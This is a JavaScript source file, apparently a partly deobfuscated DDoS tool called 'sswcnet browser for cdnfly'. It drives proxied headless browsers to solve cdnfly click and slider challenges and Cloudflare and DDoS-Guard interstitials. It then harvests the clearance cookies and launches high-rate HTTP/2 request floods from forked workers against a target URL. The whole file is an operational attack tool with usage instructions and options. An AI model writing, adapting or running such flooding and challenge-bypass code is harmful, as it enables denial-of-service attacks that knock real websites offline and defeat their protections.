import { EventEmitter } from 'events';
import _0x135498 from 'random-useragent';
EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.setMaxListeners(0);
process.on('uncaughtException', _0xb2b091 => {
});
process.on('unhandledRejection', _0x1a37a7 => {
});
process.on('SIGHUP', () => {
    return 1;
});
process.on('SIGCHILD', () => {
    return 1;
});
import { connect } from 'puppeteer-real-browser';
import { connect as _0x2ad905 } from 'http2';
import { spawn } from 'child_process';
import _0x5ea068 from 'fs';
import _0x4069cc from 'colors';
import { URL } from 'url';
import _0x3913db from 'cluster';
import _0x4e6ce2 from 'timers/promises';
import _0x599a9a from 'tls';
import _0x2d8f2c from 'net';
import { exec } from 'child_process';
if (process.argv.length < 4) {
    console.clear();
    console.log('\n         ' + 'sswcnet browser for cdnfly. V1'.red.bold + ' ');
    console.log('');
    console.log('\n    ' + ('cdnfly v1'.underline + ' | bypass cdnfly 5s js click and so on').italic + '\n\n    ' + 'Usage:'.bold.underline + '\n\n        ' + ('xvfb-run node BROWSER.mjs ' + '['.red.bold + 'target' + ']'.red.bold + ' ' + '['.red.bold + 'duration' + ']'.red.bold + ' ' + '['.red.bold + 'threads' + ']'.red.bold + ' ' + '['.red.bold + 'rate' + ']'.red.bold + ' ' + '['.red.bold + 'proxy' + ']'.red.bold + ' ' + '('.red.bold + 'options' + ')'.red.bold).italic + '\n        ' + 'xvfb-run node BROWSER.mjs https://google.com 300 5 90 proxy.txt --debug true'.italic + '\n\n    ' + 'Options:'.bold.underline + '\n\n        --debug         ' + 'true'.green + '        ' + '-'.red.bold + '   ' + 'Enabled basic debugging.'.italic + '\n        --bypass        ' + 'true'.green + '        ' + '-'.red.bold + '   ' + 'IP-cookie bound flood'.italic + '\n        --flooder       ' + 'true'.green + '        ' + '-'.red.bold + '   ' + 'Use built-in HTTP2 flooder.'.italic + '\n        --headless      ' + 'true'.green + '        ' + '-'.red.bold + '   ' + 'Render browser without ui.'.italic + '\n        --randrate      ' + 'true'.green + '        ' + '-'.red.bold + '   ' + 'Random rate of requests.'.italic + '\n        --optimize      ' + 'true'.green + '        ' + '-'.red.bold + '   ' + 'Block stylesheets to increase speed.'.italic + '\n        --fingerprint   ' + 'true'.green + '        ' + '-'.red.bold + '   ' + 'Enable browser fingerprint.'.italic + '\n    ');
    process.exit(0);
}
const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]) || 10;
const rate = process.argv[5] || 64;
const proxyfile = process.argv[6];
let flooders = 0;
function error(_0xc849c3) {
    console.log('   ' + '['.red + 'error'.bold + ']'.red + ' ' + _0xc849c3);
    process.exit(0);
}
if (!proxyfile) {
    error('Invalid proxy file!');
}
if (!duration || isNaN(duration) || duration <= 0) {
    error('Invalid duration format!');
}
if (!threads || isNaN(threads) || threads <= 0) {
    error('Invalid threads format!');
}
if (!rate || isNaN(rate) || rate <= 0) {
    error('Invalid ratelimit format!');
}
var proxies = _0x5ea068.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');
if (proxies.length <= 0) {
    error('Proxy file is empty!');
}
const parsed = new URL(target);
function get_option(_0x1e2e64) {
    const _0x157feb = process.argv.indexOf(_0x1e2e64);
    return _0x157feb !== -1 && _0x157feb + 1 < process.argv.length ? process.argv[_0x157feb + 1] : undefined;
}
const options = [
    {
        'flag': '--debug',
        'value': get_option('--debug')
    },
    {
        'flag': '--bypass',
        'value': get_option('--bypass')
    },
    {
        'flag': '--flooder',
        'value': get_option('--floder')
    },
    {
        'flag': '--headless',
        'value': get_option('--headless')
    },
    {
        'flag': '--randrate',
        'value': get_option('--randrate')
    },
    {
        'flag': '--optimize',
        'value': get_option('--optimize')
    },
    {
        'flag': '--fingerprint',
        'value': get_option('--fingerprint')
    }
];
function enabled(_0x4bd9e4) {
    var _0x4071bd = '--' + _0x4bd9e4;
    const _0x10dcff = options.find(_0x47abda => _0x47abda.flag === _0x4071bd);
    if (_0x10dcff === undefined) {
        return false;
    }
    const _0x2d7f56 = _0x10dcff.value;
    if (_0x2d7f56 === 'true' || _0x2d7f56 === true) {
        return true;
    } else if (_0x2d7f56 === 'false' || _0x2d7f56 === false) {
        return false;
    } else if (!isNaN(_0x2d7f56)) {
        return parseInt(_0x2d7f56);
    } else {
        return false;
    }
}
function log(_0x5ed84f) {
    let _0x3733c6 = new Date();
    let _0xb97da8 = (_0x3733c6.getHours() < 10 ? '0' : '') + _0x3733c6.getHours();
    let _0x2ca0c1 = (_0x3733c6.getMinutes() < 10 ? '0' : '') + _0x3733c6.getMinutes();
    let _0x27e74a = (_0x3733c6.getSeconds() < 10 ? '0' : '') + _0x3733c6.getSeconds();
    if (isNaN(_0xb97da8) || isNaN(_0x2ca0c1) || isNaN(_0x27e74a)) {
        _0xb97da8 = 'undefined';
        _0x2ca0c1 = 'undefined';
        _0x27e74a = 'undefined';
    }
    if (enabled('debug')) {
        console.log('[BROWSER] (' + (_0xb97da8 + ':' + _0x2ca0c1 + ':' + _0x27e74a).cyan + ') | ' + _0x5ed84f);
    }
}
function random_proxy() {
    let _0x20a578 = proxies[~~(Math.random() * proxies.length)].split(':');
    while (usedProxies[_0x20a578]) {
        if (Object.keys(usedProxies).length == proxies.length) {
            return;
        }
        _0x20a578 = proxies[~~(Math.random() * proxies.length)].split(':');
    }
    return _0x20a578;
}
function random_int(_0x4e6c7f, _0x176e2a) {
    return Math.floor(Math.random() * (_0x176e2a - _0x4e6c7f + 1)) + _0x4e6c7f;
}
async function spawn_flooder(_0x5805c4, _0x2917e1, _0x55bdf9) {
    let _0x351ce7;
    if (enabled('randrate')) {
        _0x351ce7 = random_int(1, 90);
    } else {
        _0x351ce7 = rate;
    }
    let _0x3e7f41;
    if (enabled('bypass')) {
        _0x3e7f41 = [
            '--ip',
            _0x5805c4.join(':')
        ];
    }
    const _0x10d210 = [
        'flood.js',
        target,
        '60',
        '1',
        _0x5805c4.join(':'),
        _0x351ce7,
        _0x55bdf9,
        _0x2917e1,
        'GET'
    ];
    console.log('\n--------------------------\nArguments sent:', _0x10d210.join(' '), '\n--------------------------\n');
    const _0x3d5d5c = spawn('node', _0x10d210);
    _0x3d5d5c.on('data', _0x1961e8 => {
    });
    _0x3d5d5c.on('exit', (_0x10fa63, _0x38a8aa) => {
        _0x3d5d5c.kill();
    });
}
async function flooder(_0x5e31df, _0x18ba8c, _0x2ce138) {
    if (!enabled('flooder')) {
        spawn_flooder(_0x5e31df, _0x18ba8c, _0x2ce138);
        return;
    }
    let _0x2f6973;
    const _0x35fb92 = _0x2d8f2c.connect(Number(_0x5e31df[1]), _0x5e31df[0], () => {
        _0x35fb92.once('data', () => {
            const _0x1d0236 = _0x2ad905(target, {
                'protocol': 'https',
                'settings': {
                    'headerTableSize': 65536,
                    'maxConcurrentStreams': 1000,
                    'initialWindowSize': 62914560,
                    'maxHeaderListSize': 2621440,
                    'enablePush': false
                },
                'createConnection': () => {
                    _0x2f6973 = _0x599a9a.connect({
                        'host': parsed.host,
                        'ciphers': 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256;',
                        'echdCurve': 'GREASE:X25519:x25519',
                        'host': parsed.host,
                        'servername': parsed.host,
                        'minVersion': 'TLSv1.1',
                        'maxVersion': 'TLSv1.3',
                        'secure': true,
                        'requestCert': true,
                        'rejectUnauthorized': false,
                        'ALPNProtocols': ['h2'],
                        'socket': _0x35fb92
                    });
                    _0x2f6973.allowHalfOpen = true;
                    _0x2f6973.setNoDelay(true);
                    _0x2f6973.setKeepAlive(true, 60000);
                    _0x2f6973.setTimeout(10000);
                    _0x2f6973.setMaxListeners(0);
                    return _0x2f6973;
                }
            }, function () {
                function _0x97577e() {
                    if (_0x1d0236.destroyed) {
                        return;
                    }
                    let _0x4aff6a;
                    if (enabled('randrate')) {
                        _0x4aff6a = random_int(1, 90);
                    } else {
                        _0x4aff6a = rate;
                    }
                    for (var _0x4ac043 = 0; _0x4ac043 < _0x4aff6a; _0x4ac043++) {
                        const _0x96b43b = _0x1d0236.request({
                            ':path': parsed.path,
                            ':method': 'GET',
                            ':authority': parsed.host,
                            ':scheme': 'https',
                            'upgrade-insecure-requests': '1',
                            'user-agent': _0x18ba8c,
                            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"macOS"',
                            'sec-fetch-dest': 'document',
                            'sec-fetch-mode': 'navigate',
                            'sec-fetch-site': 'same-site',
                            'sec-fetch-user': '?1',
                            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                            'accept-encoding': 'gzip, deflate, br, zstd',
                            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                            'priority': 'u=0, i',
                            'referer': parsed.href,
                            'cookie': _0x2ce138
                        });
                        if (enabled('debug')) {
                            _0x96b43b.on('response', (_0x56e20b, _0x1b4e6f) => {
                                const _0x1efdc7 = _0x56e20b.:status;
                                let _0x2e1d1e;
                                switch (true) {
                                case _0x1efdc7 < 500 && _0x1efdc7 >= 400 && _0x1efdc7 !== 404:
                                    _0x2e1d1e = _0x1efdc7.toString().red;
                                    break;
                                case _0x1efdc7 >= 300 && _0x1efdc7 < 400:
                                    _0x2e1d1e = _0x1efdc7.toString().yellow;
                                    break;
                                case _0x1efdc7 === 503:
                                    _0x2e1d1e = _0x1efdc7.toString().cyan;
                                    break;
                                default:
                                    _0x2e1d1e = _0x1efdc7.toString().green;
                                }
                                log('(' + _0x4069cc.magenta(_0x5e31df[0]) + ') ' + parsed.host + ', ' + _0x2e1d1e);
                            });
                        }
                        _0x96b43b.end();
                    }
                    setTimeout(() => {
                        _0x97577e();
                    }, 1000 / _0x4aff6a);
                }
                _0x97577e();
            }).on('error', _0x2c3f80 => {
                if (_0x2c3f80.code === 'ERR_HTTP2_GOAWAY_SESSION' || _0x2c3f80.code === 'ECONNRESET' || _0x2c3f80.code == 'ERR_HTTP2_ERROR') {
                    _0x1d0236.close();
                }
            });
        }).on('error', () => {
            _0x2f6973.destroy();
        });
        _0x35fb92.write('CONNECT ' + parsed.host + ':443 HTTP/1.1\r\nHost: ' + parsed.host + ':443\r\nProxy-Connection: Keep-Alive\r\n\r\n');
    }).once('close', () => {
        if (_0x2f6973) {
            _0x2f6973.end(() => {
                _0x2f6973.destroy();
                attack();
            });
        }
    });
}
async function browser(_0x5c60fe) {
    let _0x195ff3;
    let _0x33c3d8;
    try {
        let {
            page: _0x742cde,
            browser: _0x54214f
        } = await connect({
            'headless': enabled('headless') ? true : 'auto',
            'fingerprint': enabled('fingerprint') ? true : false,
            'turnstile': true,
            'tf': true,
            'proxy': {
                'host': _0x5c60fe[0],
                'port': _0x5c60fe[1]
            }
        });
        _0x195ff3 = _0x742cde;
        _0x33c3d8 = _0x54214f;
        await _0x195ff3.setUserAgent(_0x135498.getRandom());
        await _0x195ff3.setJavaScriptEnabled(true);
        await _0x195ff3.setDefaultNavigationTimeout(0);
        if (enabled('optimize')) {
            await _0x195ff3.setRequestInterception(true);
            await _0x195ff3.on('request', _0x5ebe91 => {
                if (_0x5ebe91.resourceType() == 'stylesheet' || _0x5ebe91.resourceType() == 'font' || _0x5ebe91.resourceType() == 'image') {
                    _0x5ebe91.abort();
                } else {
                    _0x5ebe91.continue();
                }
            });
        }
        await _0x195ff3.goto(target, { 'waitUntil': 'domcontentloaded' });
        const _0x46b426 = await _0x195ff3.evaluate(() => {
            return navigator.userAgent;
        });
        log('(' + _0x4069cc.magenta(_0x5c60fe[0]) + ') User-Agent: ' + _0x4069cc.yellow(_0x46b426));
        let _0x40fd3a = [];
        const _0x29af44 = _0x5a5904 => {
            return new Promise(_0x26884f => setTimeout(_0x26884f, _0x5a5904));
        };
        await _0x29af44(2000);
        const _0x4b916b = await _0x195ff3.content();
        if (_0x4b916b.indexOf('html.js?js=click_html') !== -1) {
            console.log('准备绕过点击');
            const {width, height} = await _0x195ff3.evaluate(() => {
                return {
                    'width': document.documentElement.clientWidth,
                    'height': document.documentElement.clientHeight
                };
            });
            const _0x3550bd = width * 0.5;
            const _0x527ed7 = height * 0.32;
            console.log(width + '  ' + height + '\n');
            for (var _0x520371 = 0; _0x520371 < 30; _0x520371++) {
                await _0x195ff3.mouse.click(_0x3550bd, 30 + 10 * _0x520371);
                await _0x29af44(150);
            }
        } else if (await _0x195ff3.$('#icon') !== null) {
            console.log('准备绕过滑块');
            const _0x53bf16 = '#icon';
            const _0x364197 = await _0x195ff3.evaluate(_0x79b8f0 => {
                const _0x4eb12c = document.querySelector(_0x79b8f0);
                if (!_0x4eb12c) {
                    throw new Error('Element not found');
                }
                const _0x2a8358 = _0x4eb12c.getBoundingClientRect();
                return {
                    'x': _0x2a8358.x,
                    'y': _0x2a8358.y,
                    'width': _0x2a8358.width,
                    'height': _0x2a8358.height
                };
            }, _0x53bf16);
            console.log('滑块绕过数据', _0x364197);
            await _0x195ff3.mouse.move(_0x364197.x + 16, _0x364197.y + 16);
            await _0x195ff3.mouse.down();
            await _0x195ff3.mouse.move(_0x364197.x + 630, _0x364197.y + 16, { 'steps': 10 });
            await _0x195ff3.mouse.up();
        } else {
            console.log('其他延迟类策略绕过');
            await _0x29af44(3000);
        }
        await _0x29af44(3000);
        async function _0x1daab5() {
            const _0x501999 = setInterval(async () => {
                const _0x487c35 = await _0x195ff3.title();
                if (_0x487c35.startsWith('Failed to load URL ')) {
                    await _0x33c3d8.close();
                    if (flooders >= threads) {
                        return;
                    }
                    browser(random_proxy());
                    clearInterval(_0x501999);
                }
                if (!_0x487c35) {
                    return;
                }
                if (_0x487c35 !== _0x40fd3a[_0x40fd3a.length - 1]) {
                    log('(' + _0x4069cc.magenta(_0x5c60fe[0]) + ') Title: ' + _0x4069cc.italic(_0x487c35));
                }
                try {
                    _0x40fd3a.push(_0x487c35);
                } catch {
                    console.log('failed to push title? what XD');
                }
                if (!_0x487c35.includes('Just a moment...') && _0x487c35 !== undefined) {
                    clearInterval(_0x501999);
                    return;
                }
            }, 1000).unref();
        }
        await _0x1daab5();
        let _0x51fb70 = [
            'just a moment...',
            'ddos-guard'
        ];
        await new Promise(async _0x39a1c4 => {
            while (_0x40fd3a.length == 0 || _0x51fb70.filter(_0x5c1c2a => _0x40fd3a[_0x40fd3a.length - 1].toLowerCase().indexOf(_0x5c1c2a) != -1).length > 0) {
                await _0x4e6ce2.setTimeout(100, null, { 'ref': false });
            }
            _0x39a1c4(null);
        });
        var _0x25d553 = await _0x195ff3.cookies();
        if (_0x25d553.length > 0) {
            const _0x4b121f = _0x25d553.map(_0x5399cc => _0x5399cc.name + '=' + _0x5399cc.value).join('; ');
            log('(' + _0x4069cc.magenta(_0x5c60fe[0]) + ') Cookies: ' + _0x4069cc.green(_0x4b121f));
            log('(' + _0x4069cc.magenta(_0x5c60fe[0]) + ') ' + _0x4069cc.cyan.underline('Launching flooder'));
            flooder(_0x5c60fe, _0x46b426, _0x4b121f);
            flooders++;
        }
    } catch (_0x2d5ae7) {
        if (enabled('debug')) {
            log('(' + _0x4069cc.magenta(_0x5c60fe[0]) + ') Error: ' + _0x4069cc.red(_0x2d5ae7.message));
        }
    } finally {
        if (_0x33c3d8 && _0x195ff3) {
            await _0x195ff3.close();
            await _0x33c3d8.close();
        }
        if (flooders >= threads) {
            return;
        }
        browser(random_proxy());
    }
}
function start() {
    browser(random_proxy());
}
if (_0x3913db.isMaster) {
    let _options = '';
    for (var x = 0; x < options.length; x++) {
        if (options[x].value !== undefined) {
            _options += options[x].flag.replace('--', '') + ', ';
        }
    }
    console.clear();
    console.log('\n         ' + 'sswcnet browser for cdnfly. V1'.red.bold);
    console.log('');
    console.log(_0x4069cc.cyan('                        t.me/sswcnet'));
    console.log('\n            ' + 'METHOD'.bold + '      ' + '-'.red + '   ' + '['.red + ' ' + 'BROWSER (v1.1)'.italic + ' ' + ']'.red + ' \n            ' + 'TARGET'.bold + '      ' + '-'.red + '   ' + '['.red + ' ' + ('' + target).italic + ' ' + ']'.red + ' \n            ' + 'TIME'.bold + '        ' + '-'.red + '   ' + '['.red + ' ' + ('' + duration).italic + ' ' + ']'.red + ' \n            ' + 'THREADS'.bold + '     ' + '-'.red + '   ' + '['.red + ' ' + ('' + threads).italic + ' ' + ']'.red + ' \n            ' + 'RATE'.bold + '        ' + '-'.red + '   ' + '['.red + ' ' + ('' + rate).italic + ' ' + ']'.red + '\n            ' + 'OPTIONS'.bold + '     ' + '-'.red + '   ' + '['.red + ' ' + ('' + _options).italic + ' ' + ']'.red);
    for (let i = 0; i < threads; i++) {
        _0x3913db.fork();
    }
    setTimeout(() => process.exit(log('Master process exiting')), duration * 1000);
} else {
    start();
    setTimeout(() => process.exit(log('Subprocess ' + process.pid + ' exiting')), duration * 1000);
}